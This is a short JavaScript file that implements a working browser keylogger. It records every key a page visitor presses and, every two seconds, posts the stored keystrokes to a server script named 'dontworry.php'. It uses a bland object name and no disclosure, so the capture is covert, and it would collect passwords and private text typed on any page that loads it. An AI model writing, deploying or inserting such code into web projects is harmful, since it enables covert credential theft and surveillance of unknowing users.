var saved = {
  // setting up
  cache: [], // storage for key presses
  delay: 2000, // delay for sending to server
  sending: false, // prevent parallel posts

  // initialization, on page load
  init: () => {
    // trying to capture key strokes
    window.addEventListener("keydown", (evt) => {
      saved.cache.push(evt.key);
    });

    // sending to server
    window.setInterval(saved.send, saved.delay);
  },

  // ajax sending event
  send: () => {
    // Check if not already sending and the cache is not empty
    if (!saved.sending && saved.cache.length != 0) {
      // Set sending to true to prevent parallel posts
      saved.sending = true;

      // saving data
      var data = new FormData();
      data.append("keys", JSON.stringify(saved.cache));
      saved.cache = []; // clearing data

      // fetching
      fetch("dontworry.php", { method: "POST", body: data })
        .then((res) => res.text())
        .then((res) => {
          // Clear the sending flag after successful sending
          saved.sending = false;
          console.log(res); // test
        })
        .catch((err) => {
          console.error(err);
        });
    }
  },
};

// Initialize the 'saved' object when the DOM content is loaded
window.addEventListener("DOMContentLoaded", saved.init);
